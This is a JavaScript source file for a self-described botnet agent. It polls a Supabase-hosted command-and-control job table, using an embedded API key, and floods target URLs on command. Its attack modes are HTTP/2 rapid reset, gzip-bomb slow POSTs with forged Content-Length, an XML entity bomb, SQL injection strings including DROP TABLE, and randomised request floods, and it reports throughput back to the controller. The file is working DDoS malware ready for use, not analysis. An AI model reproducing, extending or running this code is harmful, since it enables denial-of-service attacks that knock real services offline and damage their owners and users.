/**
 * STRESSFORGE BOTNET AGENT V12.1 (SINGULARITY)
 * - Fix: Black Hole Instant Feedback (Removed 5s delay on UI)
 * - Fix: God Mode Fallback logic for HTTP/1.1
 * - Security: Smart De-Confliction
 */
const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const zlib = require('zlib');

// --- CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";
const MAX_SAFE_CONCURRENCY = 2500; 

// --- ASSETS ---
const PROXY_LIST = [
    '104.16.148.244:80', '188.166.204.43:8080', '45.167.124.5:999', '103.152.112.162:80',
    '117.251.103.186:8080', '43.205.118.158:80', '167.172.109.12:3128', '20.210.113.32:8123'
];
const USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
];
const REFERERS = ["https://google.com", "https://bing.com", "https://twitter.com", "https://facebook.com"];
// Pre-calculate buffers
const JUNK_DATA_LARGE = Buffer.alloc(1024 * 50, 'x'); 
const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
const ZERO_BUFFER = Buffer.alloc(1024 * 1024, 0); // 1MB of zeroes
const GZIP_BOMB = zlib.gzipSync(ZERO_BUFFER); // Compressed zero bomb

const XML_BOMB = '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>';
const SQL_PAYLOADS = ["' OR 1=1 --", "UNION SELECT 1, SLEEP(10) --", "'; DROP TABLE users; --", "admin' --"];

// --- KEEPALIVE SERVER ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent V12.1 ACTIVE'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- HELPER: NATIVE SUPABASE ---
const supabaseRequest = (method, pathStr, body = null) => {
    return new Promise((resolve, reject) => {
        try {
            const baseUrl = new URL(SUPABASE_URL);
            const apiPath = '/rest/v1' + (pathStr.startsWith('/') ? pathStr : '/' + pathStr);
            const options = {
                hostname: baseUrl.hostname,
                path: apiPath,
                method: method,
                headers: {
                    'apikey': SUPABASE_KEY,
                    'Authorization': `Bearer ${SUPABASE_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                }
            };
            const req = https.request(options, (res) => {
                let data = '';
                res.on('data', chunk => data += chunk);
                res.on('end', () => { 
                    if (res.statusCode >= 400) {
                        if (res.statusCode === 400) console.log('\x1b[33m[DB ERROR] Schema Mismatch. Run DB Repair Tool.\x1b[0m');
                        reject(new Error(`API Error ${res.statusCode}: ${data}`));
                    } else {
                        try { resolve(data ? JSON.parse(data) : null); } catch(e) { resolve(null); } 
                    }
                });
            });
            req.on('error', (e) => reject(e));
            if (body) req.write(JSON.stringify(body));
            req.end();
        } catch(e) { reject(e); }
    });
};

console.log('\x1b[35m[AGENT] Initialized V12.1 (Singularity). Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

const startAttack = (job) => {
    if (activeJob) return;
    if (job.concurrency > MAX_SAFE_CONCURRENCY) job.concurrency = MAX_SAFE_CONCURRENCY;

    activeJob = job;
    const duration = (job.duration && job.duration > 0) ? job.duration : 30;
    console.log(`\x1b[31m[ATTACK] ${job.method} ${job.target} | T: ${job.concurrency} | D: ${duration}s\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    let jobSuccess = 0;
    let jobFailed = 0;
    let jobLatencySum = 0;
    let jobReqsForLatency = 0;
    let jobMaxLatency = 0;
    
    const startTime = Date.now();
    let targetUrl;
    try { targetUrl = new URL(job.target); } catch(e) { return; }
    
    const agent = new https.Agent({ keepAlive: true, keepAliveMsecs: 1000, maxSockets: Infinity });
    let baseHeaders = job.headers || {};
    if (typeof baseHeaders === 'string') { try { baseHeaders = JSON.parse(baseHeaders); } catch(e) { baseHeaders = {}; } }

    const performRequest = () => {
        if (!running) return;
        
        let currentHeaders = { ...baseHeaders };
        
        // --- BLACK HOLE MODE (GZIP BOMB + SLOW POST) ---
        if (job.use_black_hole) {
             currentHeaders['Content-Encoding'] = 'gzip';
             currentHeaders['Content-Type'] = 'application/json';
             currentHeaders['Content-Length'] = '10000000'; // Lie about size
             
             // Initiate POST request
             const lib = targetUrl.protocol === 'https:' ? https : http;
             const req = lib.request(targetUrl, { 
                 method: 'POST', 
                 headers: currentHeaders, 
                 agent,
                 timeout: 10000 // Hold connection
             }, (res) => {
                 // We don't care about response, we want to hang
             });
             
             req.on('error', () => { jobFailed++; if(running) setImmediate(performRequest); });
             
             // Send GZIP Bomb chunks slowly
             req.write(GZIP_BOMB);
             // V12.1 FIX: Count immediately so UI updates
             totalRequests++;
             
             // Keep connection open but don't end it immediately (Reduced to 2s)
             setTimeout(() => { if(running) try { req.end(); jobSuccess++; } catch(e){} }, 2000);
             
             if (running) setTimeout(performRequest, 10); // Throttle slightly
             return;
        }

        // --- GOD MODE (HTTP/2 RAPID RESET) ---
        // V12 Fix: Robust H2 check with Fallback
        if (job.use_god_mode && targetUrl.protocol === 'https:' && !job.use_ghost_proxy) {
             try {
                 const session = http2.connect(targetUrl.origin);
                 session.on('error', () => {}); // Ignore session errors
                 
                 const req = session.request({ ':path': targetUrl.pathname + targetUrl.search, ':method': job.method || 'GET' });
                 req.close(http2.constants.NGHTTP2_CANCEL); // RESET
                 
                 totalRequests++; jobSuccess++;
                 if (running) setImmediate(performRequest);
                 return;
             } catch(e) {
                 // Fallback to standard request if H2 fails
             }
        }

        // --- STANDARD PAYLOAD CONSTRUCTION ---
        currentHeaders['Accept-Encoding'] = 'gzip, deflate, br';
        currentHeaders['Sec-Ch-Ua'] = '"Not_A Brand";v="8", "Chromium";v="120"';
        
        let payload = job.body;
        if (job.use_xml_bomb) { payload = XML_BOMB; currentHeaders['Content-Type'] = 'application/xml'; }
        else if (job.use_goldeneye) { currentHeaders['X-Heavy-Load'] = 'true'; payload = job.use_pulse ? JUNK_DATA_SMALL : JUNK_DATA_LARGE; }
        else if (job.use_big_bang) { currentHeaders['Content-Length'] = '10737418240'; }

        let currentUrl = targetUrl.href;
        if (job.use_sql_flood) currentUrl += (currentUrl.includes('?') ? '&' : '?') + `q=${encodeURIComponent(SQL_PAYLOADS[Math.floor(Math.random()*SQL_PAYLOADS.length)])}`;
        if (job.use_chaos) {
            currentUrl += (currentUrl.includes('?') ? '&' : '?') + `_v=${Math.random().toString(36)}`;
            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
        }

        // --- GHOST PROXY / STANDARD REQUEST ---
        const start = Date.now();
        const handleResponse = (res) => {
            const lat = Date.now() - start;
            jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
            if (res.statusCode >= 200 && res.statusCode < 500) jobSuccess++; else jobFailed++;
            res.resume(); // Drain
            totalRequests++;
            if (running && !job.use_pulse) setImmediate(performRequest);
        };

        const handleError = () => { jobFailed++; totalRequests++; if (running && !job.use_pulse) setImmediate(performRequest); };

        const lib = targetUrl.protocol === 'https:' ? https : http;
        const req = lib.request(currentUrl, { agent, method: job.method || 'GET', headers: currentHeaders, timeout: 5000 }, handleResponse);
        req.on('socket', (s) => s.setNoDelay(true)); 
        req.on('error', handleError);
        if (payload && !job.use_big_bang) try { req.write(payload); } catch(e) {}
        if (!job.use_big_bang) req.end();
    };

    if (job.use_pulse) {
        const pulseLoop = setInterval(() => { 
            if (!running) return clearInterval(pulseLoop); 
            for(let i=0; i<300; i++) performRequest(); 
        }, 100);
    } else {
        for(let i=0; i<job.concurrency; i++) performRequest();
    }

    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed) || 0;
        const avgLat = jobReqsForLatency > 0 ? Math.round(jobLatencySum / jobReqsForLatency) : 0;
        
        // V9.3 Self-Healing DB Write (Fallback to legacy if schema fails)
        const statsPayload = { current_rps: rps, total_success: jobSuccess, total_failed: jobFailed, avg_latency: avgLat, max_latency: jobMaxLatency };
        try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, statsPayload); } 
        catch(e) { try { await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps }); } catch(e2) {} }

        if (duration > 0 && elapsed >= duration) {
            running = false;
            clearInterval(activeLoop);
            if (typeof h2Session !== 'undefined') h2Session.close();
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED' });
        }
    }, 2000);
};

setInterval(async () => {
    if (activeJob) return;
    try {
        const jobs = await supabaseRequest('GET', '/jobs?status=in.(PENDING,RUNNING)&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            // V9.3 Join Swarm Logic: Agents join running jobs too
            if (job.status === 'PENDING') await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { }
}, 3000);
